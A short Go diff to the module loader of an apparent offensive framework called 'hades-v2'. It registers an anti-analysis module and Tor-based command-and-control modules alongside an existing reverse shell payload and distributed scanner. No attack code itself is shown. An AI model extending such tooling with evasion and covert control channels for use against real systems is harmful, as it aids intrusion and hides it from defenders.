@@ -3,6 +3,7 @@ package modules
 import (
 	"fmt"
 
+	"hades-v2/modules/anti_analysis"
 	"hades-v2/modules/auxiliary"
 	"hades-v2/modules/payload"
 	"hades-v2/pkg/sdk"
@@ -13,6 +14,9 @@ func LoadAllModules(dispatcher interface {
 	RegisterModule(module sdk.Module) error
 }) error {
 	modules := []sdk.Module{
+		// Anti-analysis modules
+		anti_analysis.NewAntiAnalysisModule(),
+
 		// Payload modules
 		payload.NewReverseShell(),
 
@@ -26,6 +30,9 @@ func LoadAllModules(dispatcher interface {
 		auxiliary.NewEventHandler(),
 		auxiliary.NewTrendAnalyzer(),
 		auxiliary.NewDistributedScanner(),
+		auxiliary.NewTorManager(),
+		auxiliary.NewTorC2(),
+		auxiliary.NewTorNetworkStats(),
 	}
 
 	for _, module := range modules {
